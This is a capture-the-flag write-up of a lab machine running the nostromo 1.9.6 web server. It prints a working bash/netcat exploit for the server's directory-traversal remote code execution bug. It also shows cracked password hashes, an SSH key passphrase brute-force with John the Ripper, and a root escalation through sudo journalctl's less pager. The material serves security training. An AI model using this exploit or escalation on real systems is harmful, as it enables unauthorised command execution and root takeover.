![](./logo.png)

Initially scanning the webpage gives us `ssh` and `http`.

Using `gobuster` on the website heavily throttles it. We're going to have to find another way.

However the web server banner is `nostromo 1.9.6`. With a quick Google it shows this server is vulnerable to
a RCE via directory traversal.

Below is a PoC created the use of `\r` allows us to obtain the `/bin/sh` binary and pass it a command we want

```sh
#!/usr/bin/env bash

HOST="$1"
PORT="$2"
shift 2

( \
    echo -n -e 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'; \
    echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
    echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
    | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'
```

With the request looks like so like so:
```
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
Content-Length: 1

echo
echo
<COMMAND> 2>&1
```

This functionality is bundled up in `exploit.sh`.


Doing a `lse.sh` scan shows us a `htpasswd` file with a hash!

```
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Cracking this with `jtr` gives us:

```
david:Nowonly4me
```

This password wasn't useful anywhere, so I continued looking.


The final piece was in the `nhttp.d` file with the `HOMEDIRS` section:

The [documentation](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd) contains a section on `HOMEDIR`:

```
HOMEDIRS
To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:

http://www.nazgul.ch/~hacki/

The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.
You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public 

```
With our config looking like so:
```
# HOMEDIRS [OPTIONAL]

homedirs		    /home
homedirs_public		public_www
```

This means we can access `david` from the `http` server via:

```
http://10.10.10.165/~david
```

But this was no use!

The presence of the `public_www` shows it is locked down to that directory, but what if we try from our reverse shell?

We can access it and this shows the presence of a `protected-file-area` directory!

This contains a `backup-ssh-identity-files.tgz`

This provides us with a SSH Private key we can use to connect. But - you guessed it - it is password protected so we have to do a little 
more brute forcing.

Using [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) Jumbo we can use the SSH RSA brute force functionality with
`ssh2john.py`

Then running:
```
john --format=SSH ./ssh_hash.txt
```
Gives us the password `hunter`.

The passsword on the RSA key can be removed like so:
```
openssl rsa -in id_rsa -out id_rsa_no_pass
```
We can use this to connect via `ssh` and grab the `user.txt`!


# ROOT

In `/home/david` there is a script:

```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The key bit is the line:
```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

This is running `journalctl` as `sudo`. We can leverage this because it is running the command without a password


Running:

```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

Puts us in a `less` session we can just type `!/bin/sh` to obtain a shell as `root`!